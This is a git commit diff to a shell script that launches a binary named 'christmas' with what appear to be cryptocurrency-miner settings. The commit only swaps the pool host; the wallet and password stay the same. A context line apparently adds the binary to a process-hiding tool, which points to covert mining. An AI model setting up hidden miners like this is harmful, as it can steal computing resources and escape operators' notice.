433f8a2c74615324e9dcb7eb5e69d9d7f5daaeb5
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-01-05 10:32:51 +0200

    Update start_Xmas_AzAz2_no_ws.sh

--- start_Xmas_AzAz2_no_ws.sh
+++ start_Xmas_AzAz2_no_ws.sh
@@ -13,4 +13,4 @@ chmod +x christmas
 
 ph add christmas
 
-./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz2 -p IhatePopUps
+./christmas -a gr -o raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz2 -p IhatePopUps
